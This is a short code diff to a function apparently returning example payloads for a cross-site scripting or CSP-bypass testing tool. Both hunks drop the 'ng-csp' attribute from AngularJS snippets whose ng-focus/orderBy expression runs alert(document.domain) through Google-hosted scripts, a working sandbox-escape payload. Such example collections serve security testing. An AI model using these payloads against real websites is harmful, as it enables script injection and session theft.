@@ -41,7 +41,7 @@ def get_examples():
                 """
                 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
 
-                <div ng-app ng-csp>
+                <div ng-app>
                   <input ng-focus="$event.composedPath()|orderBy:'alert(document.domain)'" value="Click me!">
                 </div>
                 """
@@ -132,7 +132,7 @@ def get_examples():
                 """
                 <script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
 
-                <div ng-app ng-csp>
+                <div ng-app>
                   <input ng-focus="$event.composedPath()|orderBy:'alert(document.domain)'" value="Click me!">
                 </div>
                 """
